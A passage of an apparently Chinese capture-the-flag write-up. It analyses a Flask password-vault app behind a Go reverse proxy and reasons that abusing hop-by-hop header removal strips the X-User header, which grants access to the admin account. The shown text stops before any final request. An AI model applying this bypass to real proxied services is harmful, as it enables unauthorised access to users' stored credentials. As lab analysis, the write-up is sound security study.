</span></span><span style=display:flex><span>                flash(<span style=color:#e6db74>&#39;Username and password are required.&#39;</span>, <span style=color:#e6db74>&#39;danger&#39;</span>)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;register.html&#39;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> password <span style=color:#f92672>!=</span> confirm_password:
</span></span><span style=display:flex><span>                flash(<span style=color:#e6db74>&#39;Passwords do not match.&#39;</span>, <span style=color:#e6db74>&#39;danger&#39;</span>)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;register.html&#39;</span>)
</span></span><span style=display:flex><span>            salt <span style=color:#f92672>=</span> generate_salt()
</span></span><span style=display:flex><span>            password_hash <span style=color:#f92672>=</span> hash_password(password, salt)
</span></span><span style=display:flex><span>            user <span style=color:#f92672>=</span> User(
</span></span><span style=display:flex><span>                username<span style=color:#f92672>=</span>username,
</span></span><span style=display:flex><span>                password_hash<span style=color:#f92672>=</span>password_hash,
</span></span><span style=display:flex><span>                salt<span style=color:#f92672>=</span>base64<span style=color:#f92672>.</span>b64encode(salt)<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>),
</span></span><span style=display:flex><span>            )
</span></span><span style=display:flex><span>            db<span style=color:#f92672>.</span>session<span style=color:#f92672>.</span>add(user)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>                db<span style=color:#f92672>.</span>session<span style=color:#f92672>.</span>commit()
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>except</span> IntegrityError:
</span></span><span style=display:flex><span>                db<span style=color:#f92672>.</span>session<span style=color:#f92672>.</span>rollback()
</span></span><span style=display:flex><span>                flash(<span style=color:#e6db74>&#39;Username already exists. Please choose another.&#39;</span>, <span style=color:#e6db74>&#39;warning&#39;</span>)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;register.html&#39;</span>)
</span></span><span style=display:flex><span>            flash(<span style=color:#e6db74>&#39;Registration successful. Please sign in.&#39;</span>, <span style=color:#e6db74>&#39;success&#39;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;login&#39;</span>))
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;register.html&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/login&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>login</span>():
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;POST&#39;</span>:
</span></span><span style=display:flex><span>            username <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;username&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>            password <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;password&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)
</span></span><span style=display:flex><span>            user <span style=color:#f92672>=</span> User<span style=color:#f92672>.</span>query<span style=color:#f92672>.</span>filter_by(username<span style=color:#f92672>=</span>username)<span style=color:#f92672>.</span>first()
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> user <span style=color:#f92672>or</span> <span style=color:#f92672>not</span> verify_password(password, user<span style=color:#f92672>.</span>salt, user<span style=color:#f92672>.</span>password_hash):
</span></span><span style=display:flex><span>                flash(<span style=color:#e6db74>&#39;Invalid username or password.&#39;</span>, <span style=color:#e6db74>&#39;danger&#39;</span>)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;login.html&#39;</span>)
</span></span><span style=display:flex><span>            r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(app<span style=color:#f92672>.</span>config[<span style=color:#e6db74>&#39;SIGN_SERVER&#39;</span>], params<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#39;uid&#39;</span>: user<span style=color:#f92672>.</span>id}, timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> r<span style=color:#f92672>.</span>status_code <span style=color:#f92672>!=</span> <span style=color:#ae81ff>200</span>:
</span></span><span style=display:flex><span>                flash(<span style=color:#e6db74>&#39;Unable to reach the authentication server. Please try again later.&#39;</span>, <span style=color:#e6db74>&#39;danger&#39;</span>)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;login.html&#39;</span>)
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>            token <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>text<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>            response <span style=color:#f92672>=</span> make_response(redirect(url_for(<span style=color:#e6db74>&#39;dashboard&#39;</span>)))
</span></span><span style=display:flex><span>            response<span style=color:#f92672>.</span>set_cookie(
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;token&#39;</span>,
</span></span><span style=display:flex><span>                token,
</span></span><span style=display:flex><span>                httponly<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>,
</span></span><span style=display:flex><span>                secure<span style=color:#f92672>=</span>app<span style=color:#f92672>.</span>config<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;SESSION_COOKIE_SECURE&#39;</span>, <span style=color:#66d9ef>False</span>),
</span></span><span style=display:flex><span>                samesite<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;Lax&#39;</span>,
</span></span><span style=display:flex><span>                max_age<span style=color:#f92672>=</span><span style=color:#ae81ff>12</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>3600</span>,
</span></span><span style=display:flex><span>            )
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> response
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;login.html&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/logout&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>logout</span>():
</span></span><span style=display:flex><span>        response <span style=color:#f92672>=</span> make_response(redirect(url_for(<span style=color:#e6db74>&#39;login&#39;</span>)))
</span></span><span style=display:flex><span>        response<span style=color:#f92672>.</span>delete_cookie(<span style=color:#e6db74>&#39;token&#39;</span>)
</span></span><span style=display:flex><span>        flash(<span style=color:#e6db74>&#39;Signed out.&#39;</span>, <span style=color:#e6db74>&#39;info&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> response
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/dashboard&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@login_required</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>dashboard</span>():
</span></span><span style=display:flex><span>        user <span style=color:#f92672>=</span> g<span style=color:#f92672>.</span>current_user
</span></span><span style=display:flex><span>        entries <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>            {
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;id&#39;</span>: entry<span style=color:#f92672>.</span>id,
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;label&#39;</span>: entry<span style=color:#f92672>.</span>label,
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;login&#39;</span>: entry<span style=color:#f92672>.</span>login,
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;password&#39;</span>: fernet<span style=color:#f92672>.</span>decrypt(entry<span style=color:#f92672>.</span>password_encrypted<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>))<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>),
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;notes&#39;</span>: entry<span style=color:#f92672>.</span>notes,
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;created_at&#39;</span>: entry<span style=color:#f92672>.</span>created_at,
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> entry <span style=color:#f92672>in</span> user<span style=color:#f92672>.</span>vault_entries
</span></span><span style=display:flex><span>        ]
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;dashboard.html&#39;</span>, username<span style=color:#f92672>=</span>user<span style=color:#f92672>.</span>username, entries<span style=color:#f92672>=</span>entries)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/passwords/new&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@login_required</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>create_password</span>():
</span></span><span style=display:flex><span>        user <span style=color:#f92672>=</span> g<span style=color:#f92672>.</span>current_user
</span></span><span style=display:flex><span>        label <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;label&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>        login_value <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;login&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>        password_plain <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;password&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>        notes <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;notes&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)<span style=color:#f92672>.</span>strip() <span style=color:#f92672>or</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> label <span style=color:#f92672>or</span> <span style=color:#f92672>not</span> login_value <span style=color:#f92672>or</span> <span style=color:#f92672>not</span> password_plain:
</span></span><span style=display:flex><span>            flash(<span style=color:#e6db74>&#39;Service name, login, and password are required.&#39;</span>, <span style=color:#e6db74>&#39;danger&#39;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;dashboard&#39;</span>))
</span></span><span style=display:flex><span>        encrypted_password <span style=color:#f92672>=</span> fernet<span style=color:#f92672>.</span>encrypt(password_plain<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>))<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>        entry <span style=color:#f92672>=</span> VaultEntry(
</span></span><span style=display:flex><span>            user_id<span style=color:#f92672>=</span>user<span style=color:#f92672>.</span>id,
</span></span><span style=display:flex><span>            label<span style=color:#f92672>=</span>label,
</span></span><span style=display:flex><span>            login<span style=color:#f92672>=</span>login_value,
</span></span><span style=display:flex><span>            password_encrypted<span style=color:#f92672>=</span>encrypted_password,
</span></span><span style=display:flex><span>            notes<span style=color:#f92672>=</span>notes,
</span></span><span style=display:flex><span>        )
</span></span><span style=display:flex><span>        db<span style=color:#f92672>.</span>session<span style=color:#f92672>.</span>add(entry)
</span></span><span style=display:flex><span>        db<span style=color:#f92672>.</span>session<span style=color:#f92672>.</span>commit()
</span></span><span style=display:flex><span>        flash(<span style=color:#e6db74>&#39;Password entry saved.&#39;</span>, <span style=color:#e6db74>&#39;success&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;dashboard&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/passwords/&lt;int:entry_id&gt;&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;DELETE&#39;</span>])
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@login_required</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>delete_password</span>(entry_id: int):
</span></span><span style=display:flex><span>        user <span style=color:#f92672>=</span> g<span style=color:#f92672>.</span>current_user
</span></span><span style=display:flex><span>        entry <span style=color:#f92672>=</span> VaultEntry<span style=color:#f92672>.</span>query<span style=color:#f92672>.</span>filter_by(id<span style=color:#f92672>=</span>entry_id, user_id<span style=color:#f92672>=</span>user<span style=color:#f92672>.</span>id)<span style=color:#f92672>.</span>first()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> entry:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> jsonify({<span style=color:#e6db74>&#39;success&#39;</span>: <span style=color:#66d9ef>False</span>, <span style=color:#e6db74>&#39;message&#39;</span>: <span style=color:#e6db74>&#39;Entry not found&#39;</span>}), <span style=color:#ae81ff>404</span>
</span></span><span style=display:flex><span>        db<span style=color:#f92672>.</span>session<span style=color:#f92672>.</span>delete(entry)
</span></span><span style=display:flex><span>        db<span style=color:#f92672>.</span>session<span style=color:#f92672>.</span>commit()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> jsonify({<span style=color:#e6db74>&#39;success&#39;</span>: <span style=color:#66d9ef>True</span>})
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> app
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    flask_app <span style=color:#f92672>=</span> create_app()
</span></span><span style=display:flex><span>    flask_app<span style=color:#f92672>.</span>run(host<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;127.0.0.1&#39;</span>, port<span style=color:#f92672>=</span><span style=color:#ae81ff>5000</span>, debug<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span></code></pre></div><p>获取flag就要伪造admin身份登录，直接获取密码行不通 entrypoint.sh：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>start_vault<span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    cd /app/vault <span style=color:#f92672>&amp;&amp;</span> FERNET_KEY<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#34;from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())&#34;</span><span style=color:#66d9ef>)</span> su vault -s /bin/sh -c <span style=color:#e6db74>&#34;python3 app.py&#34;</span> &amp;
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>注意到鉴权是通过 X-User 进行的：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>login_required</span>(view_func):
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>@wraps</span>(view_func)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>wrapped</span>(<span style=color:#f92672>*</span>args, <span style=color:#f92672>**</span>kwargs):
</span></span><span style=display:flex><span>            uid <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>headers<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;X-User&#39;</span>, <span style=color:#e6db74>&#39;0&#39;</span>)
</span></span><span style=display:flex><span>            print(uid)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> uid <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;anonymous&#39;</span>:
</span></span><span style=display:flex><span>                flash(<span style=color:#e6db74>&#39;Please sign in first.&#39;</span>, <span style=color:#e6db74>&#39;warning&#39;</span>)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;login&#39;</span>))
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>                uid_int <span style=color:#f92672>=</span> int(uid)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>except</span> (<span style=color:#a6e22e>TypeError</span>, <span style=color:#a6e22e>ValueError</span>):
</span></span><span style=display:flex><span>                flash(<span style=color:#e6db74>&#39;Invalid session. Please sign in again.&#39;</span>, <span style=color:#e6db74>&#39;warning&#39;</span>)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;login&#39;</span>))
</span></span><span style=display:flex><span>            user <span style=color:#f92672>=</span> User<span style=color:#f92672>.</span>query<span style=color:#f92672>.</span>filter_by(id<span style=color:#f92672>=</span>uid_int)<span style=color:#f92672>.</span>first()
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> user:
</span></span><span style=display:flex><span>                flash(<span style=color:#e6db74>&#39;User not found. Please sign in again.&#39;</span>, <span style=color:#e6db74>&#39;warning&#39;</span>)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;login&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            g<span style=color:#f92672>.</span>current_user <span style=color:#f92672>=</span> user
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> view_func(<span style=color:#f92672>*</span>args, <span style=color:#f92672>**</span>kwargs)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> wrapped
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
</span></span><span style=display:flex><span>        uid <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>headers<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;X-User&#39;</span>, <span style=color:#e6db74>&#39;0&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> uid <span style=color:#f92672>or</span> uid <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;anonymous&#39;</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;login&#39;</span>))
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;dashboard&#39;</span>))
</span></span></code></pre></div><p>因此只需要设置 X-User 为0或者能够不带 X-User 访问路由<code>/</code>就能伪造admin用户登录</p><p>根据 main.go 中的 GetUIDFromRequest， uid 是通过 jwt 获取的，而 jwt 签名的 SecretKey 又是随机生成的：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#66d9ef>var</span> (
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>SecretKey</span> = <span style=color:#a6e22e>hex</span>.<span style=color:#a6e22e>EncodeToString</span>(<span style=color:#a6e22e>RandomBytes</span>(<span style=color:#ae81ff>32</span>))
</span></span><span style=display:flex><span>)
</span></span></code></pre></div><p>无法直接伪造 jwt，直接设置 X-User 为0也不行，在 main.go 的反向代理中会重新设置用户信息：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#a6e22e>authorizer</span> <span style=color:#f92672>:=</span> <span style=color:#f92672>&amp;</span><span style=color:#a6e22e>httputil</span>.<span style=color:#a6e22e>ReverseProxy</span>{<span style=color:#a6e22e>Director</span>: <span style=color:#66d9ef>func</span>(<span style=color:#a6e22e>req</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Request</span>) {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>URL</span>.<span style=color:#a6e22e>Scheme</span> = <span style=color:#e6db74>&#34;http&#34;</span>
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>URL</span>.<span style=color:#a6e22e>Host</span> = <span style=color:#e6db74>&#34;127.0.0.1:5000&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>uid</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>GetUIDFromRequest</span>(<span style=color:#a6e22e>req</span>)
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>log</span>.<span style=color:#a6e22e>Printf</span>(<span style=color:#e6db74>&#34;Request UID: %s, URL: %s&#34;</span>, <span style=color:#a6e22e>uid</span>, <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>URL</span>.<span style=color:#a6e22e>String</span>())
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>Header</span>.<span style=color:#a6e22e>Del</span>(<span style=color:#e6db74>&#34;Authorization&#34;</span>)
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>Header</span>.<span style=color:#a6e22e>Del</span>(<span style=color:#e6db74>&#34;X-User&#34;</span>)
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>Header</span>.<span style=color:#a6e22e>Del</span>(<span style=color:#e6db74>&#34;X-Forwarded-For&#34;</span>)
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>Header</span>.<span style=color:#a6e22e>Del</span>(<span style=color:#e6db74>&#34;Cookie&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>uid</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;&#34;</span> {
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>Header</span>.<span style=color:#a6e22e>Set</span>(<span style=color:#e6db74>&#34;X-User&#34;</span>, <span style=color:#e6db74>&#34;anonymous&#34;</span>)
</span></span><span style=display:flex><span>		} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>Header</span>.<span style=color:#a6e22e>Set</span>(<span style=color:#e6db74>&#34;X-User&#34;</span>, <span style=color:#a6e22e>uid</span>)
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>	}}
</span></span></code></pre></div><p>唯一能打通的可能就是不带 X-User 访问，reverseproxy.go：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#66d9ef>func</span> (<span style=color:#a6e22e>p</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>ReverseProxy</span>) <span style=color:#a6e22e>ServeHTTP</span>(<span style=color:#a6e22e>rw</span> <span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>ResponseWriter</span>, <span style=color:#a6e22e>req</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Request</span>) {
</span></span><span style=display:flex><span><span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#a6e22e>p</span>.<span style=color:#a6e22e>Director</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>p</span>.<span style=color:#a6e22e>Director</span>(<span style=color:#a6e22e>outreq</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#a6e22e>outreq</span>.<span style=color:#a6e22e>Form</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>outreq</span>.<span style=color:#a6e22e>URL</span>.<span style=color:#a6e22e>RawQuery</span> = <span style=color:#a6e22e>cleanQueryParams</span>(<span style=color:#a6e22e>outreq</span>.<span style=color:#a6e22e>URL</span>.<span style=color:#a6e22e>RawQuery</span>)
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>outreq</span>.<span style=color:#a6e22e>Close</span> = <span style=color:#66d9ef>false</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>reqUpType</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>upgradeType</span>(<span style=color:#a6e22e>outreq</span>.<span style=color:#a6e22e>Header</span>)
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> !<span style=color:#a6e22e>ascii</span>.<span style=color:#a6e22e>IsPrint</span>(<span style=color:#a6e22e>reqUpType</span>) {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>p</span>.<span style=color:#a6e22e>getErrorHandler</span>()(<span style=color:#a6e22e>rw</span>, <span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>fmt</span>.<span style=color:#a6e22e>Errorf</span>(<span style=color:#e6db74>&#34;client tried to switch to invalid protocol %q&#34;</span>, <span style=color:#a6e22e>reqUpType</span>))
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>removeHopByHopHeaders</span>(<span style=color:#a6e22e>outreq</span>.<span style=color:#a6e22e>Header</span>)
</span></span><span style=display:flex><span><span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// removeHopByHopHeaders removes hop-by-hop headers.</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>removeHopByHopHeaders</span>(<span style=color:#a6e22e>h</span> <span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Header</span>) {
</span></span><span style=display:flex><span>	<span style=color:#75715e>// RFC 7230, section 6.1: Remove headers listed in the &#34;Connection&#34; header.</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> <span style=color:#a6e22e>_</span>, <span style=color:#a6e22e>f</span> <span style=color:#f92672>:=</span> <span style=color:#66d9ef>range</span> <span style=color:#a6e22e>h</span>[<span style=color:#e6db74>&#34;Connection&#34;</span>] {
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>for</span> <span style=color:#a6e22e>sf</span> <span style=color:#f92672>:=</span> <span style=color:#66d9ef>range</span> <span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>SplitSeq</span>(<span style=color:#a6e22e>f</span>, <span style=color:#e6db74>&#34;,&#34;</span>) {
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>sf</span> = <span style=color:#a6e22e>textproto</span>.<span style=color:#a6e22e>TrimString</span>(<span style=color:#a6e22e>sf</span>); <span style=color:#a6e22e>sf</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;&#34;</span> {
</span></span><span style=display:flex><span>				<span style=color:#a6e22e>h</span>.<span style=color:#a6e22e>Del</span>(<span style=color:#a6e22e>sf</span>)
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#75715e>// RFC 2616, section 13.5.1: Remove a set of known hop-by-hop headers.</span>
</span></span><span style=display:flex><span>	<span style=color:#75715e>// This behavior is superseded by the RFC 7230 Connection header, but</span>
</span></span><span style=display:flex><span>	<span style=color:#75715e>// preserve it for backwards compatibility.</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> <span style=color:#a6e22e>_</span>, <span style=color:#a6e22e>f</span> <span style=color:#f92672>:=</span> <span style=color:#66d9ef>range</span> <span style=color:#a6e22e>hopHeaders</span> {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>h</span>.<span style=color:#a6e22e>Del</span>(<span style=color:#a6e22e>f</span>)
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
